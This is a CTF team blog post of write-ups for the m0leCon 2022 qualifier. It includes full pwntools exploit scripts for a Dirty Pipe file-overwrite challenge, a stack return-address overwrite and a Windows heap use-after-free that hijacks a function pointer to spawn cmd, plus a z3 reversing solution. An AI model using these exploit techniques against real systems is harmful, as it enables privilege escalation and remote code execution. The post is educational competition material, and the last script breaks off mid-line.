<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>m0leCon CTF 2022 Teaser | Blog | bootplug</title><meta name=keywords content="ctf,pwn,dirty pipe,ssti"><meta name=description content="Writeups from m0leCon CTF 2022 qualifier"><meta name=author content="maritio_o, PewZ, klarz, poiko, zup, UnblvR, webhak, Blissy, Sithis, Kat"><link rel=canonical href=https://bootplug.io/posts/ctf/m0leconctf_2022/><link crossorigin=anonymous href=/assets/css/stylesheet.min.6f60056d44d3f7eb69a4bc6c332b59960f3a995802bded244750232f33713c49.css integrity="sha256-b2AFbUTT9+tppLxsMytZlg86mVgCve0kR1AjLzNxPEk=" rel="preload stylesheet" as=style><link rel=preload href=/images/bootplug.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bootplug.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://bootplug.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bootplug.io/favicon-32x32.png><link rel=apple-touch-icon href=https://bootplug.io/apple-touch-icon.png><link rel=mask-icon href=https://bootplug.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.99.0"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="m0leCon CTF 2022 Teaser"><meta property="og:description" content="Writeups from m0leCon CTF 2022 qualifier"><meta property="og:type" content="article"><meta property="og:url" content="https://bootplug.io/posts/ctf/m0leconctf_2022/"><meta property="og:image" content="https://bootplug.io/papermod-cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-15T11:05:16+02:00"><meta property="article:modified_time" content="2022-05-15T11:05:16+02:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bootplug.io/papermod-cover.png"><meta name=twitter:title content="m0leCon CTF 2022 Teaser"><meta name=twitter:description content="Writeups from m0leCon CTF 2022 qualifier"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bootplug.io/posts/"},{"@type":"ListItem","position":2,"name":"CTFs","item":"https://bootplug.io/posts/ctf/"},{"@type":"ListItem","position":3,"name":"m0leCon CTF 2022 Teaser","item":"https://bootplug.io/posts/ctf/m0leconctf_2022/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"m0leCon CTF 2022 Teaser","name":"m0leCon CTF 2022 Teaser","description":"Writeups from m0leCon CTF 2022 qualifier","keywords":["ctf","pwn","dirty pipe","ssti"],"articleBody":"pwn dirtyRAT  Author: @Gaaat\nDescription: I bought this backdoor from some hacking/carding group on Telegram but I’m starting to suspect that I have been scammed… Can anyone help me access the only file I really need?\nnc dirtyrat.challs.m0lecon.it 10010\n We were given a binary and the source code.\nIt was mentioned early on that the title might be a wordplay on the recent Dirty Pipe vulnerability. But we disregarded the idea for a while. Also, we noticed a splice() in the code and found that a bit weird.\nRunning the binary, we get the following menu:\n60 seconds, PWN! Welcome to 88 88 88888888ba db 888888888888 88 \"\" ,d 88 \"8b d88b 88 88 88 88 ,8P d8'`8b 88 ,adPPYb,88 88 8b,dPPYba, MM88MMM 8b d8 88aaaaaa8P' d8' `8b 88 a8\" `Y88 88 88P' \"Y8 88 `8b d8' 88\"\"\"\"88' d8YaaaaY8b 88 8b 88 88 88 88 `8b d8' 88 `8b d8\"\"\"\"\"\"\"\"8b 88 \"8a, ,d88 88 88 88, `8b,d8' 88 `8b d8' `8b 88 `\"8bbdP\"Y8 88 88 \"Y888 Y88' 88 `8b d8' `8b 88 d8' d8' CLI Victim info:\tLinux bc31d47e2ff0 5.10.60-051060-generic #202108180439 SMP Wed Aug 18 08:59:30 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux Whoami:\trat Available commands: 1)List files in folder. 2)Read file from our curated list of important files :) 3)Write data to one file from our curated list of important files :) 4)Win the CTF for me pls ≧◡≦ -1)Quit If we list files, we see there is a file called flag which we cannot read:\nYour choice: 1 total 1072 drwxr-xr-x 2 root root 4096 May 15 08:50 . drwxrwxrwt 1 root root 20480 May 15 08:50 .. -rw-r--r-- 1 user user 80 May 12 12:53 cards -rw-r--r-- 1 user user 48 May 12 12:53 conf -rwxr-xr-x 1 rat rat 1048040 May 12 12:53 dirtyRAT -rw-r--r-- 1 user user 31 May 12 12:53 flag -rw-r--r-- 1 user user 132 May 12 12:53 pasw -rw-r--r-- 1 user user 885 May 12 12:53 priv -rw-r--r-- 1 user user 43 May 12 12:53 secr What is interesting here is that the conf file contains a list of files we may read:\nYour choice: 2 Insert filename: conf How many bytes to read? (Max 127 eheheeheh): 127 File content: ##DIRTY CONFIG HEADER conf cards priv secr pasw PJ!� File read With this information and reading the code, we tried to exploit the binary.\nFirst, we tried to modify the config, but struggled since the only file we had write permissions to was dirtyRAT. Then we understood that the trouble with persmissions fit perfectly into the Dirty Pipe vulnerability. The version number you might have noticed under the banner is a kernel version vulnerable to Dirty Pipe. Also, the dirtyRAT binary contains all the code required to exploit the vulnerability. All we needed to do was to run them in the correct order:\n Fill the pipe with arbitrary data to set the PIPE_BUF_FLAG_CAN_MERGE flag Drain the pipe Splice 128 bytes from the priv file. We do this because there was a read in the way that we had to stop Splice 22 bytes from the conf file to skip header Add flag to the conf file  Then after having flag successfully put into the conf file, we could read the flag file by choosing menu option 2.\nAnd then we got the flag ptm{W4it_wa5nt_1t_r3ad_0nly!?}\nHere is the solve script:\n#!/usr/bin/env python # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template --host dirtyrat.challs.m0lecon.it --port 10010 ./files/chall/dirtyRAT from pwn import *  exe = context.binary = ELF('./files/chall/dirtyRAT') host = args.HOST or 'dirtyrat.challs.m0lecon.it' port = int(args.PORT or 10010)  def local(argv=[], *a, **kw):  '''Execute the target binary locally'''  if args.GDB:  return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  else:  return process([exe.path] + argv, *a, **kw)  def remote(argv=[], *a, **kw):  '''Connect to the process on the remote host'''  io = connect(host, port)  if args.GDB:  gdb.attach(io, gdbscript=gdbscript)  return io  def start(argv=[], *a, **kw):  '''Start the exploit against the target.'''  if args.LOCAL:  return local(argv, *a, **kw)  else:  return remote(argv, *a, **kw)  gdbscript = ''' tbreak main continue '''.format(**locals())  #=========================================================== # EXPLOIT GOES HERE #=========================================================== # Arch: amd64-64-little # RELRO: Partial RELRO # Stack: Canary found # NX: NX enabled # PIE: No PIE (0x400000)  io = start()  def menu(choice):  io.sendlineafter(\"choice: \", str(choice))  def list_files():  menu(1)  def read_file(filename, size):  menu(2)  io.sendlineafter(\"filename: \", filename)  io.sendlineafter(\": \", str(size))  io.recvuntil(\"File content:\")  io.recvline()  return io.recvline()  def write(filename, data, padding):  menu(3)  io.sendlineafter(\"filename: \", filename)  io.sendlineafter(\": \", data)  io.sendlineafter(\": \", str(padding))  # 1. prepare_pipe (fill + drain) # 2. splice 128 bytes from priv # 3. splice 22 bytes from conf to skip header # 4. write to pipe # 5. read flag  pipe_size = 0x10000 write(\"conf\", \"A\"*0x40, pipe_size - 0x40) read_file(\"priv\", 128) read_file(\"conf\", 22) write(\"conf\", \"flag\\n\", 0)  read_file(\"flag\", 127) flag = read_file(\"flag\", 127)[1:].decode().strip() log.success(f\"flag: {flag}\") io.close() ptmList  Author: @Alberto247\nDescription: Thanks to ptmList you can keep your shopping list in order!\nstty -icanon \u0026\u0026 socat - tcp:challs.m0lecon.it:8273 \u0026\u0026 stty icanon\n In this challenge we get an ncurses-like interface we have to interact with. We can buy, move/merge, and delete items. Additionally we also have the Secret gift menu option to modify an item. More on this later.\nHere’s the main menu:\nWelcome to ptmList, the program to help you keep your shopping lists in order! ------------------ | View item list | ------------------ | View your list | | Secret gift | | Exit | We can have up to 50 items. Each item is represented as two bytes: an index into a list of strings describing the item and a quantity. Free items are represented as having an index and/or quantity of 0xff. When buying an item we can also choose the quantity:\n--------------------------------------------------- box of tissues | Quantity: 10 | --------------------------------------------------- The View your list option allows us to delete and move/merge items:\n--------------------------------------------------- box of tissues | Quantity: 10 | --------------------------------------------------- carrot | Quantity: 05 | coffee pot | Quantity: 03 | Cancel w/s move, d delete, m move, Esc exit One thing we quickly noticed in myListController() is that there is a loop to find the next free item, but it goes all the way up to 0xff (255) instead of 50. The number of allocated items is stored in a variable and is updated when adding or deleting items.\nDue to the suspicious loop we assumed that there was a way to overflow or underflow the number of items. There is a check to prevent more than 50 items being allocated, so we started looking at the code to delete/move items. First there is a check in myListHandle() that causes trouble for us when we try to delete items when the number of items is zero, so we looked at move instead.\nMoving two items will swap their positions (and keep the quantity of the second item). If you try to move items of the same type, they will be merged instead of moved. As long as the combined quantity doesn’t exceed 99, the items can be merged and one of them will be deleted. The deletion code moves all items after our merged items one slot down, overwriting the second item we merged with. Finally, the number of allocated items will be decremented.\nThe loop will stop once it encounters an item with an index or quantity of 0xff. This is where the Secret gift menu comes into the picture. This option allows us to set the quantity of an item to 0xff. If we change the quantity of an item to 0xff, the merging code will stop looping when it reaches this item. What happens if we try to merge an item with one that has a quantity of 0xff? The quantities will be merged, effectively subtracting 1 from the quantity of the first item. Then, when the code tries to move all other items it will stop on the first iteration since the quantity is 0xff. Finally, the number of items will be decreased by one. By abusing this behavior we can keep merging one item with another one that has a quantity of 0xff, which will decrease the quantity of the first item by 1 and also decrease the number of items without removing any of them. Doing this a few times will underflow the count to 0xff.\nWhen the number of items is set to 0xff we can access data on the stack outside the item array. We can write values by changing the quantity of items and by moving and merging items.\nOur attack plan: Ovewrite the two least significant bytes of the return address on the stack with the address of winfunc(). The three lowest nibbles will always be 0x5e7, so we decided to just bruteforce the last one. We ended up buying the item 0x35 times, resulting in the two least significant bytes being 0x35e7.\n Buy wanted item(s) (to ovewrite least significant bytes of the return address) Buy 2 x box of tissues Secret gift on last box of tissues, setting its quantity to 0xff Merge 4 times to underflow the number of items Merge return address and with target, thus overwriting the return address with winfunc()  After running the solve script a few times, you should get a shell.\nFlag: ptm{up_up_d0wn_down_l3ft_r1ght_lef7_r1ght_A_B_pwn}\nSolve script:\n#!/usr/bin/env python # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template --host challs.m0lecon.it --port 8273 ./shoppingList from pwn import *  exe = context.binary = ELF('./shoppingList') host = args.HOST or 'challs.m0lecon.it' port = int(args.PORT or 8273)  def local(argv=[], *a, **kw):  '''Execute the target binary locally'''  if args.GDB:  return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  else:  return process([exe.path] + argv, *a, **kw)  def remote(argv=[], *a, **kw):  '''Connect to the process on the remote host'''  io = connect(host, port)  if args.GDB:  gdb.attach(io, gdbscript=gdbscript)  return io  def start(argv=[], *a, **kw):  '''Start the exploit against the target.'''  if args.LOCAL:  return local(argv, *a, **kw)  else:  return remote(argv, *a, **kw)  gdbscript = ''' continue '''.format(**locals())  def down():  io.send(\"s\")  def up():  io.send(\"w\")  def exit():  for i in range(3):  io.recvuntil(\"Exit\")  down()  io.sendline(\"\")   def buy(idx, quantity):  io.sendline(\"\")  for i in range(idx):  down()  io.sendline(\"\")   for i in range(quantity):  down()  io.sendline(\"\")  io.send(\"\\x1b\")  def secret(idx):  down()  down()  io.sendline(\"\")   for i in range(idx):  down()  io.sendline(\"\")  io = start()  # buy item to set up for partial overwrite: 0x35e7 buy(0xe7, 0x35) buy(0, 10) buy(0, 10) secret(2)  down() io.sendline(\"\") down()  # merge 4 times to underflow for i in range(4):  io.send(\"m\")  down()  io.send(\"m\")  # go down to return address for i in range(59):  down()  # merge with first item we bought io.send(\"m\") for i in range(60):  up() io.send(\"m\")  # go back to main menu io.send(\"\\x1b\")  # exit - hopefully returns to winfunc() down() down() down() io.sendline(\"\")  io.interactive() FlagMail  Author: @Matte23\nDescription: I’ve been trying to migrate our old flag submitter written in C to Kotlin. Hopefully other teams wont be able to steal our flags again. However, I still need to migrate some old C functions…\nnc flagmail.challs.m0lecon.it 4444\n In this challenge we were given a Windows binary written mostly in Kotlin. However, as the challenge description hints at, some code is still written in C.\nThe program allows us to save, delete, edit, and submit flags. Every flag we save gets a new ID, and we use that ID to perform the other actions.\nWelcome to FlagMail! - save foobar Flag saved with id=FRaqbC8wSA1XvpFVjCRGryWtIIZS2TRqf69aZbLA - edit FRaqbC8wSA1XvpFVjCRGryWtIIZS2TRqf69aZbLA lol Flag edited! - submit FRaqbC8wSA1XvpFVjCRGryWtIIZS2TRqf69aZbLA lol rFlag submitted! - By experimenting with the binary we noticed that there seems to be a UAF when deleting flags. We can still edit, delete, and submit deleted flags.\nThe menu options etc. seem to be called from Init_and_run_start(), and the interesting functions that are implemented in C are Edit, Submit, and PerformSubmit. Additionally, we also found a function called OldFunc(), which will give us a shell:\nint OldFunc(void) { \treturn system(\"cmd\"); } Each flag is stored in a struct that looks something like this:\nstruct flag { \tsize_t field_0; \tsize_t size; \tvoid (*func)(struct flag *); }; Since we have a heap UAF, we were pretty sure we could corrupt data on the heap, and that the goal was to overwrite the function pointer inside of the flag struct to get RCE.\nPerformSubmit() looks something like this:\nvoid PerformSubmit(struct flag *f) { \tif (f-field_0 == -1) \t(f-func)(f); } If we can set the first field to -1, and ovewrite the function pointer (at offset 0x10), we can get code execution. Our plan was then to overwrite the function pointer with OldFunc(), which should give us a shell.\nThere seems to be some variation in the heap layout between runs, but we observed that the flags would usually be allocated close to each other and sequentially on the heap.\nTo overwrite the function pointer we need to first defeat ASLR, so that was our first goal. ASLR is initialized at startup on Windows, so we only have to leak the base address of the binary once. After getting the base we know the address of OldFunc(). We ended up leaking the function pointer from one of the flags on the heap by corrupting the size of a flag and reading it back.\nTo corrupt the size we allocate three flags and delete the first one. The size will be set to something big so we can write out of bounds. We tried different amounts of padding to overflow into into flag2. The first 8 bytes of the flag struct has to be -1, or else it won’t print anything. We detect changes to this value by submitting the flag and checking if something is printed. If not, the value has been corrupted.\nAfter finding the offset from flag1 to flag2, we can corrupt the size of flag2 and submit it to leak the Submit() function pointer from flag3.\nNow that we have the leak we can move on to corrupt the function pointer of flag3 like we did with the size. We set the function to the address of OldFunc(). Then we just have to submit flag3, and it should give us a shell!\nAt this point we spent a lot of time trying to get our exploit to work. It seemed like we were able to successfully overwrite field_0 with -1 and the function pointer, but it would always crash when we tried executing OldFunc(). However, testing with the original function pointer (Submit()), the code was behaving exactly like before.\nOur first idea was to skip the stack initialization in OldFunc() to work around potential stack alignment issues with XMM instructions, but that didn’t work either. After a lot of trial and error we decided to set up a Windows 2022 server and perform some debugging.\nAfter finally getting everything up and running, we attached to the process using Windbg and was able to see what was going on. For some reason the process was crashing due to heap corruption while it was trying to execute cmd.\nAt this point there was less than 30 minutes left of the CTF and we were getting a bit desperate. As a final hail mary we tried adding another flag before triggering execution of the overwritten function pointer. And it worked!\nWe finally got that sweet, sweet Windows shell:\nMicrosoft Windows [Version 10.0.20348.707 (c) Microsoft Corporation. All rights reserved.  C:\\ whoami user manager\\\\containeradministrator C:\\ dir  Volume in drive C has no label.  Volume Serial Number is B2E4-3A3E   Directory of C:\\  05/04/2022 10:03 PM 571,904 challenge.exe 05/04/2022 10:03 PM 46 flag.txt 04/22/2022 12:55 AM 5,510 License.txt 05/05/2022 04:05 AM  Program Files 05/05/2022 03:41 AM  Program Files (x86) 05/12/2022 07:21 PM  socat 05/05/2022 04:11 AM  Users 05/13/2022 08:05 PM  Windows  3 File(s) 577,460 bytes  5 Dir(s) 20,609,708,032 bytes free  C:\\ type flag.txt ptm{LooK2_L1Ke_My_5U8m1tTER_12_4_81t_CONfu5Ed} Solve script:\nfrom pwn import * context.log_level = \"debug\"  leak = False # leak base address instead of overwriting pointer #leak = True  while True:  r = remote(\"flagmail.challs.m0lecon.it\", 4444)   # create flag 1  r.sendafter(b\"- \", b\"save\\n\")  r.sendline(b\"yo\")  r.recvuntil(b\"id=\")  id1 = r.recvline().decode().strip()   # create flag 2  r.sendafter(b\"- \", b\"save\\n\")  r.sendline(b\"yolo\")  r.recvuntil(b\"id=\")  id2 = r.recvline().decode().strip()   # create flag 3  r.sendafter(b\"- \", b\"save\\n\")  r.sendline(b\"yolo\")  r.recvuntil(b\"id=\")  id3 = r.recvline().decode().strip()   # delete flag 1, will set size to something big and corrupt content  r.sendafter(b\"- \", b\"delete\\n\")  r.sendline(id1.encode())   # detect if flag 2 comes right after flag 1, by gradually checking if \t# submit gives the correct output for flag 2  # (flag struct has to begin with 0xffffffffffffffff, \t# or submit will not print contents)  found = False  for times in range(1, 10):  r.sendafter(b\"- \", b\"edit\\n\")  r.sendline(id1.encode())  r.sendline((b\"A\"*8)*times)   r.sendafter(b\"- \", b\"submit\\n\")  r.sendline(id2.encode())   msg = r.recvline()   if b\"yolo\" not in msg:  print(msg)  print(times)  saved_times = times  found = True  break   if not found:  print(\"try again :(\")  r.close()  continue  #exit()   break  # manually set from leak output, will maybe change if server restarts image_base = 0x7ff62cd80000  submit = image_base + 0x25040 edit = image_base + 0x25090 oldfunc = image_base + 0x25110  log.info(f\"submit: {hex(submit)}\") log.info(f\"edit: {hex(edit)}\") log.info(f\"oldfunc: {hex(oldfunc)}\")  if not leak:  # overwrite flag 2 submit pointer  r.sendafter(b\"- \", b\"edit\\n\")  r.sendline(id1.encode())  r.sendline((b\"A\"*8)*saved_times + b\"\\xff\"*8 + p64(0x00) + p64(oldfunc))   r.sendafter(b\"- \", b\"save\\n\")  r.sendline(b\"yo\")  r.recvuntil(b\"id=\")  id4 = r.recvline().decode().strip()   # trigger function call  r.sendafter(b\"- \", b\"submit\\n\")  r.sendline(id2.encode())   # windows lol  r.recvuntil(\"C:\\\")  r.sendline(\"type flag.txt\")  r.recvline()  flag = r.recvuntil(\"\\r\\n\").decode().strip()  log.success(f\"flag: {flag}\")  context.log_level = \"debug\"  r.interactive()  exit()  # overwrite flag 2 size field r.sendafter(b\"- \", b\"edit\\n\") r.sendline(id1.encode()) r.sendline((b\"A\"*8)*saved_times + b\"\\xff\"*8 + b\"\\x01\")  # leak flag 3 submit pointer r.sendafter(b\"- \", b\"submit\\n\") r.sendline(id2.encode()) r.recvuntil(b\"\\xff\"*8 + p64(4)) submit = int.from_bytes(r.recv(8), \"little\") print(\"submit:\", hex(submit))  oldfunc = submit - 0x140025040 + 0x140025110 print(\"base:\", hex(oldfunc - 0x25110)) print(\"oldfunc:\", hex(oldfunc)) rev Circuitry magic  VHDL is for noobs, I implement all my tests in C, it is faster, easier, and more resistant to attacks!\nNote: flag needs to be wrapped in ptm{}, it is all printable ascii and it makes sense in English.\nAuthor: @Alberto247\n We are given a binary encoder and a text file output.txt. output.txt contains a list in json format:\n[{\"input\": 0, \"output\": 1}, {\"input\": 1, \"output\": 0}, {\"input\": 2, \"output\": 0}, {\"input\": 3, \"output\": 0}, {\"input\": 4, \"output\": 0}, {\"input\": 5, \"output\": 0}, {\"input\": 6, \"output\": 0}, {\"input\": 7, \"output\": 1}, {\"input\": 8, \"output\": 0}, {\"input\": 9, \"output\": 0}, {\"input\": 10, \"output\": 0}, {\"input\": 11, \"output\": 1}, {\"input\": 12, \"output\": 0}, {\"input\": 13, \"output\": 0}, {\"input\": 14, \"output\": 1}, {\"input\": 15, \"output\": 0}, {\"input\": 16, \"output\": 0}, {\"input\": 17, \"output\": 0}, {\"input\": 18, \"output\": 0}, {\"input\": 19, \"output\": 1}, {\"input\": 20, \"output\": 1}, {\"input\": 21, \"output\": 1}, {\"input\": 22, \"output\": 0}, {\"input\": 23, \"output\": 0}, {\"input\": 24, \"output\": 0}, {\"input\": 25, \"output\": 1}, {\"input\": 26, \"output\": 1}, {\"input\": 27, \"output\": 0}, {\"input\": 28, \"output\": 0}, {\"input\": 29, \"output\": 0}, {\"input\": 30, \"output\": 0}, {\"input\": 31, \"output\": 0}, {\"input\": 32, \"output\": 1}, {\"input\": 33, \"output\": 1}, {\"input\": 34, \"output\": 0}, {\"input\": 35, \"output\": 0}, {\"input\": 36, \"output\": 1}, {\"input\": 37, \"output\": 1}, {\"input\": 38, \"output\": 0}, {\"input\": 39, \"output\": 0}, {\"input\": 40, \"output\": 0}, {\"input\": 41, \"output\": 0}, {\"input\": 42, \"output\": 1}, {\"input\": 43, \"output\": 1}, {\"input\": 44, \"output\": 0}, {\"input\": 45, \"output\": 0}, {\"input\": 46, \"output\": 0}, {\"input\": 47, \"output\": 1}, {\"input\": 48, \"output\": 1}, {\"input\": 49, \"output\": 1}, {\"input\": 50, \"output\": 1}, {\"input\": 51, \"output\": 0}, {\"input\": 52, \"output\": 0}, {\"input\": 53, \"output\": 0}, {\"input\": 54, \"output\": 0}, {\"input\": 55, \"output\": 0}, {\"input\": 56, \"output\": 1}, {\"input\": 57, \"output\": 0}, {\"input\": 58, \"output\": 0}, {\"input\": 59, \"output\": 0}, {\"input\": 60, \"output\": 0}, {\"input\": 61, \"output\": 0}, {\"input\": 62, \"output\": 0}, {\"input\": 63, \"output\": 0}] This seems to be output bits for each input number from 0 to 63, probably given by the encoder program.\nLooking at the binary in a disassembler/decompiler we see that indeed it takes a number between 0 and 63 as input, does some calculations, and outputs a 0 or 1. An array called flag is used in these calculations, so the idea is probably to find what values we have to put in the flag array to give the output in output.txt.\nThe relevant code from the main function looks like this:\n int input_int;  uint8_t output_bit;   scanf(\"%d\", \u0026input_int);  if (input_int = 0 \u0026\u0026 input_int  0x3f) {  for (int i=0; i6; ++i) {  bits[5 - i] = input_int \u0026 1;  input_int = 1;  }  first_step(bits, values);  second_step(values);  third_step(values, \u0026output_bit);  printf(\"%d\", output_bit);  } We see there are three parts. The first_step function does the following:\nvoid first_step(uint8_t *bits, uint8_t *out) {  for (int i=0; i0x40; i++) {  out_val = 0;  for (int j=0; j2; j++) {  uint8_t term = 1;  for (int k=0; k6; k++)  term \u0026= first_step_array[i*0xc + j*6 + k](bits[k]);  out_val |= term;  }  out[i] = out_val;  } } The first_step_array used here is an array of functions, which are either neg or identity, doing the obvious.\nsecond_step is where the flag array comes in:\nvoid second_step(uint8_t *values) {  for (int i=0; i0x40; i++)  vals[i] \u0026= flag[i]; } And finally third_step. It uses an array of constants called chains which we can read out from the binary:\nvoid third_step(uint8_t *values, uint8_t *out_bit) {  char terms[8];   *out_bit = 0;  for (int i=0; i8; i++) {  for (int j=0; j8; j++)  terms[j] = values[chains[i*8 + (j+1) % 8]] \u0026 values[chains[i*8 + j]];  *out_bit |= terms[0] | terms[1] | terms[2] | terms[3] | terms[4] | terms[5] | terms[6] | terms[7];  } } So the path seems clear, find values for flag that makes the calculations in these three functions output the bits given in output.txt, for each number 0 through 63.\nI rewrote the functions in python and added z3 code to find the flag bits. This outputs around 50 similar flags. Not sure if this is intentional or I missed something in the code, but if we assume the flag is correct english and without leet speak there is only one choice: ptm{itslogic}.\nSolve script below:\nfirst_step_array = [1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1]  chains = [62, 56, 8, 39, 24, 43, 7, 11, 20, 61, 22, 58, 53, 18, 41, 3, 48, 59, 23, 9, 46, 63, 6, 2, 26, 25, 55, 0, 60, 54, 32, 12, 28, 42, 15, 10, 38, 50, 5, 52, 27, 47, 37, 13, 21, 14, 49, 57, 45, 19, 29, 44, 34, 40, 16, 33, 36, 30, 17, 31, 1, 35, 51, 4]  from z3 import * import json import string alph = string.ascii_letters + string.digits  s = Solver() flag = [BitVec(f\"b{i}\",1) for i in range(64)]  output = json.loads(open(\"output.txt\").read())  def xform(val):  vals = [0] * 64  bits = list(map(int,bin(val)[2:].zfill(6)))   for i in range(64):  out = 0  for j in range(2):  term = 1  for k in range(6):  term \u0026= first_step_array[12*i + 6*j + k] ^ bits[k]  out |= term  vals[i] = out   return vals  for n in range(64):  vals = xform(n)  out = vals[chains[0]] \u0026 vals[chains[1]] \u0026 flag[chains[0]] \u0026 flag[chains[1]]  for i in range(8):  for j in range(8):  idx1 = i*8 + j  idx2 = i*8 + (j+1) % 8  v = vals[chains[idx1]] \u0026 vals[chains[idx2]]  out |= v \u0026 flag[chains[idx1]] \u0026 flag[chains[idx2]]  s.add(out == output[n][\"output\"])  while s.check() == sat:  m = s.model()  sol = [m.evaluate(flag[i], model_completion=True).as_long() for i in range(64)]  cond = flag[0] != sol[0]  for i in range(1, 64):  cond = Or(cond, flag[i] != sol[i])  s.add(cond)   num = int(\"\".join(map(str,sol)),2)  st = num.to_bytes(8, \"big\")  if all(c in alph.encode() 